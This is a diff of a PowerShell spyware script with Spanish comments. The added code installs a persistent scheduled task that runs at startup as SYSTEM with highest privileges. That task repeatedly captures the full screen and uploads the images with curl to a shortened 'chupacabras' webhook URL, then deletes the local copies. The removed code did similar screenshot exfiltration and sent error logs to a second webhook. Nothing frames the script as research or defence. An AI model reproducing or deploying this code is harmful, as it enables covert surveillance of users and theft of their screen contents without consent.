@@ -1,91 +1,83 @@
-# Función para enviar mensajes de error al webhook secundario
-function SendErrorLogToSecondaryWebhook {
+# Función para crear la tarea programada al iniciar Windows
+function CreateScheduledTask {
     param(
-        [string]$errorMessage
+        [string]$taskName,
+        [string]$scriptPath
     )
+
     try {
-        $secondaryWebhookUrl = "https://bit.ly/web_chupacabras"  # URL del webhook secundario
-        Invoke-WebRequest -Uri $secondaryWebhookUrl -Method Post -Body "{""error"":""$errorMessage""}" -ContentType "application/json" -ErrorAction Stop
+        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-File '$scriptPath'"
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -DontStopOnIdleEnd
+
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force
     } catch {
-        Write-Host "Error al enviar registro de error al webhook secundario: $_"
+        Write-Host "Error al crear la tarea programada: $_"
     }
 }
 
-# Función para crear la carpeta temporal si no existe
-function CreateTempFolder {
-    $TempFolder = "$env:temp\sysw"
-    if (-not (Test-Path -Path $TempFolder)) {
+# Ruta del script PowerShell y nombre de la tarea programada
+$scriptPath = "$env:temp\sysw.ps1"
+$taskName = "SyswStartupTask"
+
+# Script para el script PowerShell
+$scriptContent = @"
+# URL del webhook principal
+\$mainWebhookUrl = "https://bit.ly/web_chupakbras"
+\$seconds = 30  # Intervalo de captura de pantalla en segundos
+\$numberOfScreenshots = 20  # Cantidad de capturas de pantalla a enviar en un archivo zip
+
+# Detectar URL acortada
+if (\$mainWebhookUrl.Length -ne 121) {
+    Write-Host "URL de Webhook acortada detectada..."
+    \$mainWebhookUrl = (Invoke-RestMethod -Uri \$mainWebhookUrl).url
+}
+
+# Función para tomar y enviar capturas de pantalla
+function TakeAndSendScreenshots {
+    \$TempFolder = "\$env:temp\sysw"
+    
+    # Crea la carpeta temporal si no existe
+    if (-not (Test-Path -Path \$TempFolder)) {
+        New-Item -ItemType Directory -Path \$TempFolder | Out-Null
+    }
+    
+    # Obtiene la resolución de la pantalla
+    \$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    \$Width = \$Screen.Width
+    \$Height = \$Screen.Height
+    \$Left = \$Screen.Left
+    \$Top = \$Screen.Top
+    
+    # Toma las capturas de pantalla y las envía al webhook
+    for (\$i = 1; \$i -le \$numberOfScreenshots; \$i++) {
+        \$Filett = "\$TempFolder\SC\$i.png"
+        \$bitmap = New-Object System.Drawing.Bitmap \$Width, \$Height
+        \$graphic = [System.Drawing.Graphics]::FromImage(\$bitmap)
+        \$graphic.CopyFromScreen(\$Left, \$Top, 0, 0, \$bitmap.Size)
+        \$bitmap.Save(\$Filett, [System.Drawing.Imaging.ImageFormat]::png)
+        Start-Sleep 1
+        
         try {
-            Write-Host "Creando carpeta temporal..."
-            New-Item -ItemType Directory -Path $TempFolder -ErrorAction Stop | Out-Null
+            Write-Host "Enviando imagen \$i..."
+            curl.exe -F "file1=@\$Filett" \$mainWebhookUrl
+            Remove-Item -Path \$Filett -ErrorAction SilentlyContinue
         } catch {
-            SendErrorLogToSecondaryWebhook -errorMessage "Error al crear la carpeta temporal: $_"
-            return $false
+            Write-Host "Error al enviar la imagen \$i al webhook: \$_"
         }
     }
-    return $true
 }
 
-# Función para tomar una captura de pantalla
-function TakeScreenshot {
-    try {
-        # Crea un objeto Bitmap para la captura de pantalla
-        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-        
-        # Guarda la captura de pantalla en un archivo temporal
-        $Filett = "$TempFolder\SC$counter.png"
-        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-        
-        # Incrementa el contador
-        $counter++
-    } catch {
-        SendErrorLogToSecondaryWebhook -errorMessage "Error al tomar la captura de pantalla: $_"
-    }
+# Ejecuta la función para tomar y enviar capturas de pantalla cada 30 segundos
+while (\$true) {
+    TakeAndSendScreenshots
+    Start-Sleep -Seconds \$seconds
 }
+"@
 
-# Configuración inicial
-$Width = $Height = $Left = $Top = $counter = 0
+# Guardar el script en un archivo
+$scriptContent | Out-File -FilePath $scriptPath -Encoding ASCII
 
-# Ejecuta la función para crear la carpeta temporal
-if (!(CreateTempFolder)) {
-    Write-Host "No se pudo crear la carpeta temporal."
-    exit
-}
-
-# Obtiene la resolución de la pantalla
-try {
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-} catch {
-    SendErrorLogToSecondaryWebhook -errorMessage "Error al obtener la resolución de la pantalla: $_"
-    exit
-}
-
-# Ejecución principal
-while ($true) {
-    # Realiza la captura de pantalla
-    TakeScreenshot
-
-    # Si se ha tomado una captura de pantalla, envía el archivo
-    if ($counter -gt 0) {
-        try {
-            Write-Host "Enviando imágenes..."
-            Get-ChildItem -Path $TempFolder -Filter "*.png" | ForEach-Object {
-                Invoke-WebRequest -Uri $mainWebhookUrl -Method Post -InFile $_.FullName -ErrorAction Stop
-                Remove-Item -Path $_.FullName -Force
-            }
-            $counter = 0
-        } catch {
-            SendErrorLogToSecondaryWebhook -errorMessage "Error al enviar las imágenes al webhook: $_"
-        }
-    }
-
-    # Espera antes de tomar la próxima captura de pantalla
-    Start-Sleep -Seconds 60  # Espera 60 segundos (1 minuto) antes de tomar la próxima captura
-}
+# Crear la tarea programada para ejecutar el script al iniciar Windows
+CreateScheduledTask -taskName $taskName -scriptPath $scriptPath
 
